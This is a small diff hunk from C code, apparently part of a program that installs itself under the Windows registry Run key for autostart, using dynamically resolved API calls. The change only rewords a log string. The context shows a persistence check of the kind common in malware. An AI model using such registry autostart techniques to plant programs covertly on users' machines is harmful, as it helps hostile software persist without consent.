@@ -274,7 +274,7 @@ int SetBootForRegRun(HKEY hMainKey, char* strPEResidence)
 	iRes = lpRegQueryValueExA(hKey, key, 0, &iType, value, &valuelen);
 	if (iRes == ERROR_SUCCESS && lplstrcmpiA((char*)value, strPEResidence) == 0)
 	{
-		writeLog("lpRegQueryValueExA the key has been existed\r\n");
+		writeLog("lpRegQueryValueExA the key had existed\r\n");
 		lpRegCloseKey(hKey);
 		return TRUE;
 	}
